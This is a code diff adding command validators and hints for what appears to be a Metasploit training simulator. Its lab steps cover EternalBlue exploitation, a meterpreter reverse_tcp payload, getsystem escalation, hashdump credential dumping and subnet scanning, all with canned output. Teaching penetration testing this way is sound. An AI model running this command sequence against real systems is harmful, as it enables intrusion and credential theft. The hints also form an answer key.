+          {text:'  <span class="term-info">aka</span>       : Modules with a matching AKA name'},
+          {text:'  <span class="term-info">cve</span>       : Modules with a matching CVE ID'},
+          {text:'  <span class="term-info">name</span>      : Modules with a matching name'},
+          {text:'  <span class="term-info">platform</span>  : Modules affecting this platform'},
+          {text:'  <span class="term-info">rank</span>      : Modules with a matching rank'},
+          {text:'  <span class="term-info">type</span>      : Modules of a specific type'},
+        ]};
+      }
+      if(t[0]==='help' || t[0]==='?'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Generic help dumps every command. Pass the command name as an argument: help &lt;command&gt;.</span>'}]};
+      }
+      if(t[0]==='search'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Don\'t run search — you want help on it. The help command takes the target command as an argument.</span>'}]};
+      }
+      return { ok:false, output:[{text:`<span class="term-err">[-] Unknown command: ${t[0]||'(empty)'}.</span>`}]};
+    }
+  },
+  '2-1': {
+    validate(cmd){
+      const t = tokens(cmd);
+      if(t[0]?.toLowerCase()==='search' && t.slice(1).join(' ').toLowerCase().match(/eternalblue|ms17[-_]010/)){
+        return { ok:true, output:[
+          {text:'<span class="term-hdr">Matching Modules</span>'},
+          {text:''},
+          {text:'   #  Name                                       Disclosure  Rank      Description'},
+          {text:'   -  ----                                       ----------  ----      -----------'},
+          {text:'   0  <span class="term-ok">exploit/windows/smb/ms17_010_eternalblue</span>   2017-03-14  average   MS17-010 EternalBlue'},
+          {text:'   1  <span class="term-ok">exploit/windows/smb/ms17_010_psexec</span>        2017-03-14  normal    MS17-010 EternalRomance'},
+          {text:'   2  auxiliary/admin/smb/ms17_010_command       2017-03-14  normal    MS17-010 Command Execution'},
+          {text:'   3  auxiliary/scanner/smb/smb_ms17_010                     normal    MS17-010 SMB RCE Detection'},
+          {text:''},
+          {text:'<span class="term-dim">Interact with a module by name or index. For example: use 0</span>'},
+        ]};
+      }
+      if(t[0]?.toLowerCase()==='search'){
+        return { ok:false, output:[{text:'<span class="term-warn">[*] No results — your query missed. Try the module name or its codename.</span>'}]};
+      }
+      return { ok:false, output:[{text:`<span class="term-err">[-] Unknown command.</span>`}]};
+    }
+  },
+  '2-2': {
+    validate(cmd){
+      const lc = lower(cmd);
+      if(lc.startsWith('search') && lc.includes('cve:2017-0144')){
+        return { ok:true, output:[
+          {text:'<span class="term-hdr">Matching Modules</span>'},
+          {text:''},
+          {text:'   #  Name                                          Rank     Description'},
+          {text:'   0  exploit/windows/smb/ms17_010_eternalblue      average  MS17-010 EternalBlue'},
+          {text:'   1  exploit/windows/smb/ms17_010_psexec           normal   MS17-010 EternalRomance'},
+        ]};
+      }
+      if(lc.startsWith('search 2017-0144') || lc.startsWith('search cve-2017-0144')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Free-text on a CVE works partially, but the cve: filter is much more reliable. Try search cve:2017-0144</span>'}]};
+      }
+      if(lc.startsWith('search')){
+        return { ok:false, output:[{text:'<span class="term-warn">[*] Use the cve: filter — search cve:&lt;id&gt;.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '2-3': {
+    validate(cmd){
+      const lc = lower(cmd);
+      if(lc.startsWith('search') && lc.includes('type:exploit') && lc.includes('platform:windows') && lc.includes('smb')){
+        return { ok:true, output:[
+          {text:'<span class="term-hdr">Matching Modules (28)</span>'},
+          {text:''},
+          {text:'   0  exploit/windows/smb/cve_2020_0796_smbghost     average    SMBGhost'},
+          {text:'   1  exploit/windows/smb/ms17_010_eternalblue       average    EternalBlue'},
+          {text:'   2  exploit/windows/smb/ms17_010_psexec            normal     EternalRomance'},
+          {text:'   3  exploit/windows/smb/ms08_067_netapi            great      NetAPI Stack Corruption'},
+          {text:'   4  exploit/windows/smb/psexec                     manual     Authenticated User Code Execution'},
+          {text:'   <span class="term-dim">[truncated — 28 results]</span>'},
+        ]};
+      }
+      if(lc.includes('type:') && !lc.includes('platform:')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Got the type filter, missing platform. Combine: type:exploit platform:windows smb</span>'}]};
+      }
+      if(lc.startsWith('search smb')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That returns 80+ results — Linux Samba bugs, scanners, post-mods, everything. Add type: and platform: filters.</span>'}]};
+      }
+      if(lc.startsWith('search')){
+        return { ok:false, output:[{text:'<span class="term-warn">[*] Combine three things: type:exploit, platform:windows, and the keyword smb.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '3-1': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='use exploit/windows/smb/ms17_010_eternalblue' || lc==='use 0'){
+        return { ok:true, output:[
+          {text:'<span class="term-info">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span>'},
+          {text:'<span class="term-dim">// Prompt would now read: msf6 exploit(windows/smb/ms17_010_eternalblue) ></span>'},
+        ]};
+      }
+      if(lc.startsWith('use ') && lc.includes('eternalblue')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Module path right idea — double-check spelling: exploit/windows/smb/ms17_010_eternalblue</span>'}]};
+      }
+      if(lc.startsWith('use ')){
+        return { ok:false, output:[{text:'<span class="term-err">[-] Failed to load module: '+cmd.split(' ').slice(1).join(' ')+'</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '3-2': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='info'){
+        return { ok:true, output:[
+          {text:'       <span class="term-info">Name:</span> MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption'},
+          {text:'     <span class="term-info">Module:</span> exploit/windows/smb/ms17_010_eternalblue'},
+          {text:'   <span class="term-info">Platform:</span> Windows'},
+          {text:'       <span class="term-info">Arch:</span> x86, x64'},
+          {text:' <span class="term-info">Privileged:</span> Yes'},
+          {text:'       <span class="term-info">Rank:</span> Average'},
+          {text:'  <span class="term-info">Disclosed:</span> 2017-03-14'},
+          {text:''},
+          {text:'<span class="term-hdr">Available targets:</span>'},
+          {text:'   0   Automatic Target'},
+          {text:''},
+          {text:'<span class="term-hdr">References:</span>'},
+          {text:'  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144'},
+          {text:'  https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010'},
+        ]};
+      }
+      if(lc.startsWith('info ')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] No argument needed — info displays the loaded module\'s docs by default.</span>'}]};
+      }
+      if(lc==='show info' || lc==='describe'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Just info — no show prefix needed for the module description.</span>'}]};
+      }
+      return { ok:false, output:[{text:`<span class="term-err">[-] Unknown command: ${cmd.trim().split(' ')[0]||'(empty)'}.</span>`}]};
+    }
+  },
+  '3-3': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='show options' || lc==='options'){
+        return { ok:true, output:[
+          {text:'<span class="term-hdr">Module options (exploit/windows/smb/ms17_010_eternalblue):</span>'},
+          {text:''},
+          {text:'   Name           Current Setting  Required  Description'},
+          {text:'   ----           ---------------  --------  -----------'},
+          {text:'   <span class="term-warn">RHOSTS</span>                          <span class="term-err">yes</span>       The target host(s) (range or CIDR)'},
+          {text:'   RPORT          445              <span class="term-err">yes</span>       The target port (TCP)'},
+          {text:'   SMBDomain      .                no        Optional Windows domain'},
+          {text:'   VERIFY_ARCH    true             <span class="term-err">yes</span>       Check remote arch matches'},
+          {text:'   VERIFY_TARGET  true             <span class="term-err">yes</span>       Check remote OS matches'},
+          {text:''},
+          {text:'<span class="term-hdr">Payload options (windows/x64/meterpreter/reverse_tcp):</span>'},
+          {text:'   <span class="term-warn">LHOST</span>          <span class="term-dim">tun0</span>             <span class="term-err">yes</span>       The listen address'},
+          {text:'   LPORT          4444             <span class="term-err">yes</span>       The listen port'},
+          {text:''},
+          {text:'<span class="term-dim">// RHOSTS and LHOST are unset — those are the ones to fix next.</span>'},
+        ]};
+      }
+      if(lc==='show'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] show needs an argument: show options, show targets, show payloads...</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '3-4': {
+    validate(cmd){
+      const t = tokens(cmd);
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='rhosts' && t[2]==='10.10.10.5'){
+        return { ok:true, output:[{text:'<span class="term-ok">RHOSTS =&gt; 10.10.10.5</span>'}]};
+      }
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='rhost' && t[2]==='10.10.10.5'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Close — the option is RHOSTS (plural), not RHOST. The S matters.</span>'}]};
+      }
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='rhosts'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] RHOSTS set, but to the wrong target. The scenario specifies 10.10.10.5.</span>'}]};
+      }
+      if(t[0]?.toLowerCase()==='set'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Right command, wrong option. Look at show options — the required target field is named RHOSTS.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '4-1': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='show payloads'){
+        return { ok:true, output:[
+          {text:'<span class="term-hdr">Compatible Payloads</span>'},
+          {text:''},
+          {text:'   #   Name                                                Description'},
+          {text:'   17  <span class="term-info">windows/x64/meterpreter/reverse_tcp</span>                 Meterpreter (Windows x64), Reverse TCP'},
+          {text:'   18  windows/x64/meterpreter/reverse_https               Meterpreter, Reverse HTTPS'},
+          {text:'   19  windows/x64/meterpreter/bind_tcp                    Meterpreter, Bind TCP'},
+          {text:'   20  windows/x64/meterpreter_reverse_tcp                 Stageless meterpreter, Reverse TCP'},
+          {text:'   21  windows/x64/shell/reverse_tcp                       Piped shell, Reverse TCP'},
+          {text:'   <span class="term-dim">[truncated — 30+ payloads compatible]</span>'},
+        ]};
+      }
+      if(lc==='show options'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That shows current options, not the payload list. Try show payloads.</span>'}]};
+      }
+      if(lc.startsWith('show ')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Wrong target for show. You want the compatible payload list.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '4-2': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='set payload windows/x64/meterpreter/reverse_tcp'){
+        return { ok:true, output:[{text:'<span class="term-ok">payload =&gt; windows/x64/meterpreter/reverse_tcp</span>'}]};
+      }
+      if(lc==='set payload windows/meterpreter/reverse_tcp'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That\'s the 32-bit path — missing /x64/. The challenge wants the 64-bit variant.</span>'}]};
+      }
+      if(lc==='set payload windows/x64/meterpreter_reverse_tcp'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Underscore vs slash — that path is the *stageless* variant. The challenge wants the standard staged path with a slash before reverse_tcp.</span>'}]};
+      }
+      if(lc.startsWith('set payload')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Right command, but the path is off. Check the spelling: windows/x64/meterpreter/reverse_tcp</span>'}]};
+      }
+      if(lc.startsWith('set ')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] You\'re setting something but not the payload itself. Use set payload &lt;path&gt;.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '4-3': {
+    validate(cmd){
+      const t = tokens(cmd);
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='lhost' && t[2]==='10.10.14.2'){
+        return { ok:true, output:[{text:'<span class="term-ok">LHOST =&gt; 10.10.14.2</span>'}]};
+      }
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='lhost' && t[2]==='127.0.0.1'){
+        return { ok:false, output:[{text:'<span class="term-err">[!] LHOST set to loopback — the target can\'t reach 127.0.0.1. The session will never open. Use your VPN/tap address.</span>'}]};
+      }
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='lhost'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] LHOST set, but to the wrong address. The scenario gave 10.10.14.2.</span>'}]};
+      }
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='rhost'){
+        return { ok:false, output:[{text:'<span class="term-err">[!] You set RHOST (a target option). The challenge wants LHOST — your *listening* address. Setting it backwards points the payload at the wrong machine.</span>'}]};
+      }
+      if(t[0]?.toLowerCase()==='set'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Right command, wrong option name. The listening address option is LHOST.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '5-1': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='check'){
+        return { ok:true, output:[
+          {text:'<span class="term-info">[*] 10.10.10.5:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span>'},
+          {text:'<span class="term-ok">[+] 10.10.10.5:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64</span>'},
+          {text:'<span class="term-ok">[+] 10.10.10.5:445 - The target is vulnerable.</span>'},
+        ]};
+      }
+      if(lc==='exploit' || lc==='run'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That fires the actual exploit. The challenge asks you to *check* first — non-destructive verification.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '5-2': {
+    validate(cmd){
+      const t = tokens(lower(cmd.trim()));
+      if((t[0]==='exploit' || t[0]==='run') && t.includes('-j')){
+        return { ok:true, output:[
+          {text:'<span class="term-info">[*] Exploit running as background job 0.</span>'},
+          {text:'<span class="term-info">[*] Started reverse TCP handler on 10.10.14.2:443</span>'},
+          {text:'<span class="term-ok">[+] 10.10.10.5:445 - The target is vulnerable.</span>'},
+          {text:'<span class="term-info">[*] 10.10.10.5:445 - Connecting to target for exploitation.</span>'},
+          {text:'<span class="term-info">[*] Sending stage (200774 bytes) to 10.10.10.5</span>'},
+          {text:'<span class="term-ok">[*] Meterpreter session 1 opened (10.10.14.2:443 -&gt; 10.10.10.5:49158)</span>'},
+          {text:'<span class="term-dim">// You\'re still at the msf6 prompt — handler kept running in background.</span>'},
+        ]};
+      }
+      if(t[0]==='exploit' || t[0]==='run'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Exploit fired in foreground — your prompt is now busy until you Ctrl+Z. The challenge wants -j to background it.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '5-3': {
+    validate(cmd){
+      const t = tokens(lower(cmd.trim()));
+      if(t[0]==='sessions' && (t[1]==='-i') && t[2]==='1'){
+        return { ok:true, output:[
+          {text:'<span class="term-info">[*] Starting interaction with 1...</span>'},
+          {text:''},
+          {text: meterPrompt()+'<span class="blink">▮</span>'},
+          {text:'<span class="term-ok">// You\'re inside Meterpreter. Module 6 picks up here.</span>'},
+        ]};
+      }
+      if(t[0]==='sessions' && t[1]==='1' && !t[2]){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Almost — sessions takes -i (for "interact") before the ID. Try sessions -i 1.</span>'}]};
+      }
+      if(t[0]==='sessions' && (t.length===1 || t[1]==='-l')){
+        return { ok:false, output:[
+          {text:'Active sessions'},
+          {text:'==============='},
+          {text:'  Id  Name  Type                     Information           Connection'},
+          {text:'  --  ----  ----                     -----------           ----------'},
+          {text:'  1         meterpreter x64/windows  NT AUTHORITY\\SYSTEM   10.10.14.2:443 -&gt; 10.10.10.5:49158'},
+          {text:'<span class="term-warn">[!] That listed sessions but didn\'t enter one. Use sessions -i &lt;id&gt; to interact.</span>'},
+        ]};
+      }
+      if(t[0]==='use' && t[1]==='1'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] use is for modules, not sessions. The session command is sessions.</span>'}]};
+      }
+      if(t[0]==='interact'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Right idea, wrong syntax. msfconsole uses sessions -i, not a separate interact command.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '6-1': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='sysinfo'){
+        return { ok:true, output:[
+          {text:'Computer        : <span class="term-info">DESKTOP-WIN7</span>'},
+          {text:'OS              : <span class="term-info">Windows 7 (6.1 Build 7601, Service Pack 1)</span>'},
+          {text:'Architecture    : x64'},
+          {text:'System Language : en_US'},
+          {text:'Domain          : WORKGROUP'},
+          {text:'Logged On Users : 2'},
+          {text:'Meterpreter     : x64/windows'},
+        ]};
+      }
+      if(lc==='uname' || lc==='uname -a'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] uname is a Linux shell command. You\'re in Meterpreter — the equivalent is sysinfo.</span>'}]};
+      }
+      if(lc==='ver' || lc==='hostname'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That\'s a Windows shell command. Inside Meterpreter use sysinfo for the full picture.</span>'}]};
+      }
+      return { ok:false, output:[{text:`<span class="term-err">[-] Unknown command: ${cmd.trim().split(' ')[0]||'(empty)'}</span>`}]};
+    }
+  },
+  '6-2': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='getuid'){
+        return { ok:true, output:[
+          {text:'Server username: <span class="term-warn">DESKTOP-WIN7\\bob</span>'},
+          {text:'<span class="term-dim">// You\'re running as a regular user — escalation needed for hashdump and full post-ex.</span>'},
+        ]};
+      }
+      if(lc==='whoami'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] whoami works in a shell session, not directly in Meterpreter. The Meterpreter equivalent is getuid.</span>'}]};
+      }
+      if(lc==='id'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] id is a Linux shell command. In Meterpreter use getuid.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '6-3': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='getsystem'){
+        return { ok:true, output:[
+          {text:'<span class="term-info">[*] Trying technique 1 (Named Pipe Impersonation - In Memory/Admin)</span>'},
+          {text:'<span class="term-info">[*] Trying technique 2 (Named Pipe Impersonation - Dropper/Admin)</span>'},
+          {text:'<span class="term-info">[*] Trying technique 3 (Token Duplication - In Memory/Admin)</span>'},
+          {text:'<span class="term-ok">[+] ...got system via technique 1 (Named Pipe Impersonation - In Memory/Admin).</span>'},
+          {text:''},
+          {text:'<span class="term-dim">// Verify with getuid — you should now be NT AUTHORITY\\SYSTEM.</span>'},
+        ]};
+      }
+      if(lc.startsWith('run post/multi/recon/')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Recon modules don\'t escalate. The single Meterpreter command for SYSTEM escalation is getsystem.</span>'}]};
+      }
+      if(lc==='sudo' || lc==='su' || lc==='sudo -i'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] sudo is Linux-shell only. On Windows + Meterpreter, the escalation command is getsystem.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '6-4': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='hashdump'){
+        return { ok:true, output:[
+          {text:'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'},
+          {text:'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'},
+          {text:'admin:1000:aad3b435b51404eeaad3b435b51404ee:<span class="term-warn">8846f7eaee8fb117ad06bdd830b7586c</span>:::'},
+          {text:'TestUser:1001:aad3b435b51404eeaad3b435b51404ee:<span class="term-warn">2b576acbe6bcfda7294d6bd18041b8fe</span>:::'},
+          {text:''},
+          {text:'<span class="term-dim">// Format: username:RID:LM:NTLM::: — feed the NTLM hashes to hashcat -m 1000</span>'},
+        ]};
+      }
+      if(lc==='getsystem'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] You\'re already SYSTEM (per the scenario). Now dump the hashes.</span>'}]};
+      }
+      if(lc.startsWith('run post/windows/gather/credentials')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That works too in real life, but the simpler one-word command for local SAM hashes is hashdump.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '7-1': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='db_status'){
+        return { ok:true, output:[{text:'<span class="term-info">[*] Connected to msf. Connection type: postgresql.</span>'}]};
+      }
+      if(lc==='workspace'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] That lists workspaces (which would only work *if* the DB is connected). The dedicated check is db_status.</span>'}]};
+      }
+      if(lc==='hosts' || lc==='services'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Those query stored data. The challenge asks you to verify the DB connection itself first — db_status.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '7-2': {
+    validate(cmd){
+      const t = tokens(lower(cmd.trim()));
+      if(t[0]==='workspace' && t[1]==='-a' && t[2]==='acme'){
+        return { ok:true, output:[
+          {text:'<span class="term-ok">[*] Added workspace: acme</span>'},
+          {text:'<span class="term-ok">[*] Workspace: acme</span>'},
+        ]};
+      }
+      if(t[0]==='workspace' && t[1]==='acme'){
+        return { ok:false, output:[{text:'<span class="term-err">[-] Workspace not found: acme</span>'},{text:'<span class="term-warn">[!] Without -a, workspace tries to *switch* to an existing workspace. To create one, use -a.</span>'}]};
+      }
+      if(t[0]==='workspace' && t[1]==='-a'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Got the create flag — but the scenario named the workspace "acme".</span>'}]};
+      }
+      if(t[0]==='workspace'){
+        return { ok:false, output:[{text:'<span class="term-info">[*] Workspaces:</span>'},{text:'  default *'},{text:'<span class="term-warn">[!] Plain workspace lists existing ones. To add and switch, use workspace -a &lt;name&gt;.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '7-3': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc.startsWith('db_nmap') && lc.includes('-sv') && lc.includes('10.10.10.0/24')){
+        return { ok:true, output:[
+          {text:'<span class="term-info">[*] Nmap: Starting Nmap 7.94 ( https://nmap.org )</span>'},
+          {text:'<span class="term-info">[*] Nmap: Nmap scan report for 10.10.10.5</span>'},
+          {text:'<span class="term-info">[*] Nmap: 445/tcp  open  microsoft-ds Windows 7 Pro 7601 SP1 (smb)</span>'},
+          {text:'<span class="term-info">[*] Nmap: Nmap scan report for 10.10.10.12</span>'},
+          {text:'<span class="term-info">[*] Nmap: 22/tcp open  ssh OpenSSH 7.4 (protocol 2.0)</span>'},
+          {text:'<span class="term-info">[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 38.21 seconds</span>'},
+          {text:'<span class="term-ok">// All results auto-stored in workspace. hosts/services queries them now.</span>'},
+        ]};
+      }
+      if(lc.startsWith('nmap')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Plain nmap runs but doesn\'t feed the DB. Use db_nmap to capture results into the workspace.</span>'}]};
+      }
+      if(lc.startsWith('db_nmap') && !lc.includes('-sv')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] db_nmap launched but without -sV — you\'ll get open ports without service banners. Add -sV.</span>'}]};
+      }
+      if(lc.startsWith('db_nmap')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Wrong target. The scenario asks to scan 10.10.10.0/24.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '8-1': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='use auxiliary/scanner/smb/smb_version'){
+        return { ok:true, output:[{text:'<span class="term-dim">// Prompt now: msf6 auxiliary(scanner/smb/smb_version) ></span>'}]};
+      }
+      if(lc.startsWith('use ') && lc.includes('smb_version')){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Module path right idea — the full path is auxiliary/scanner/smb/smb_version.</span>'}]};
+      }
+      if(lc.startsWith('use ')){
+        return { ok:false, output:[{text:'<span class="term-err">[-] Failed to load module: '+cmd.split(' ').slice(1).join(' ')+'</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '8-2': {
+    validate(cmd){
+      const t = tokens(cmd);
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='rhosts' && t[2]==='10.10.10.0/24'){
+        return { ok:true, output:[{text:'<span class="term-ok">RHOSTS =&gt; 10.10.10.0/24</span>'}]};
+      }
+      if(t.length>=3 && t[0].toLowerCase()==='set' && t[1].toLowerCase()==='rhosts'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] RHOSTS set, but to the wrong target. The scenario specifies 10.10.10.0/24 (the whole subnet).</span>'}]};
+      }
+      if(t[0]?.toLowerCase()==='set'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] Right command, wrong option. Use RHOSTS for the target range.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+  '8-3': {
+    validate(cmd){
+      const lc = lower(cmd.trim());
+      if(lc==='run' || lc==='exploit'){
+        return { ok:true, output:[
+          {text:'<span class="term-ok">[+] 10.10.10.5:445  - Host is running Windows 7 Professional SP1 (build:7601) (name:DESKTOP-WIN7) (workgroup:WORKGROUP)</span>'},
+          {text:'<span class="term-ok">[+] 10.10.10.12:445 - Host is running Linux Samba 4.5.16 (workgroup:WORKGROUP)</span>'},
+          {text:'<span class="term-ok">[+] 10.10.10.18:445 - Host is running Windows Server 2008 R2 SP1 (build:7601) (name:WIN-DC01) (domain:CORP)</span>'},
+          {text:'<span class="term-info">[*] Scanned 256 of 256 hosts (100% complete)</span>'},
+          {text:'<span class="term-ok">[*] Auxiliary module execution completed</span>'},
+          {text:'<span class="term-dim">// All three hosts now stored in workspace. services -p 445 will list them.</span>'},
+        ]};
+      }
+      if(lc==='check'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] check is for exploits — auxiliary scanners use run (or exploit) to fire.</span>'}]};
+      }
+      if(lc==='start'){
+        return { ok:false, output:[{text:'<span class="term-warn">[!] No "start" command in msfconsole. To fire any module use run or exploit.</span>'}]};
+      }
+      return { ok:false, output:[{text:'<span class="term-err">[-] Unknown command.</span>'}]};
+    }
+  },
+};
+
+const HINTS = {
+  '1-1': [
+    'It\'s a single-word command. Same name as the framework itself.',
+    'Type the framework\'s console name. Starts with "msf".',
+    'Type: <code>msfconsole</code>',
+  ],
+  '1-2': [
+    'You don\'t need any flags. Just one word.',
+    'It\'s the verb that prints version info.',
+    'Type: <code>version</code>',
+  ],
+  '1-3': [
+    'The help command can take an argument.',
+    'Pass the command name you want help on as an argument.',
+    'Type: <code>help search</code>',
+  ],
+  '2-1': [
+    'The free-text query goes after the search command.',
+    'You\'re looking for the codename "EternalBlue".',
+    'Type: <code>search eternalblue</code>',
+  ],
+  '2-2': [
+    'There\'s a filter named cve: that takes a CVE ID.',
+    'Format: search cve:&lt;id&gt;',
+    'Type: <code>search cve:2017-0144</code>',
+  ],
+  '2-3': [
+    'Three filters/keywords combine with spaces.',
+    'You need type:exploit, platform:windows, and the keyword smb.',
+    'Type: <code>search type:exploit platform:windows smb</code>',
+  ],
+  '3-1': [
+    'The command to load a module is "use".',
+    'Pass the full path: exploit/windows/smb/ms17_010_eternalblue',
+    'Type: <code>use exploit/windows/smb/ms17_010_eternalblue</code>',
+  ],
+  '3-2': [
+    'A single word reads the loaded module\'s docs.',
+    'Not "show info" or "describe" — just one word.',
+    'Type: <code>info</code>',
+  ],
+  '3-3': [
+    'The command starts with "show".',
+    'Show what — options, payloads, targets? You want options.',
+    'Type: <code>show options</code>',
+  ],
+  '3-4': [
+    'The command is "set" followed by an option name and a value.',
+    'The option for target host is RHOSTS (with the S).',
+    'Type: <code>set RHOSTS 10.10.10.5</code>',
+  ],
+  '4-1': [
+    'Same "show" command pattern.',
+    'You want the list of payloads — substitute "payloads" for "options".',
+    'Type: <code>show payloads</code>',
+  ],
+  '4-2': [
+    'Use "set payload" followed by the payload path.',
+    'The path is windows / x64 / meterpreter / reverse_tcp (slashes between each).',
+    'Type: <code>set payload windows/x64/meterpreter/reverse_tcp</code>',
+  ],
+  '4-3': [
+    'Same "set" pattern, but the option is your *listening* address.',
+    'The option name is LHOST. The value is 10.10.14.2.',
+    'Type: <code>set LHOST 10.10.14.2</code>',
+  ],
+  '5-1': [
+    'A single-word command, non-destructive.',
+    'It probes whether the target is vulnerable.',
+    'Type: <code>check</code>',
+  ],
+  '5-2': [
+    'You want exploit, but with a flag to background it.',
+    'The flag is -j (for "job").',
+    'Type: <code>exploit -j</code>',
+  ],
+  '5-3': [
+    'The session subcommand is "sessions" (plural).',
+    'It needs the -i flag (interact) and the session ID.',
+    'Type: <code>sessions -i 1</code>',
+  ],
+  '6-1': [
+    'A single-word Meterpreter command for system info.',
+    'Inside Meterpreter, not the bash uname or Windows ver.',
+    'Type: <code>sysinfo</code>',
+  ],
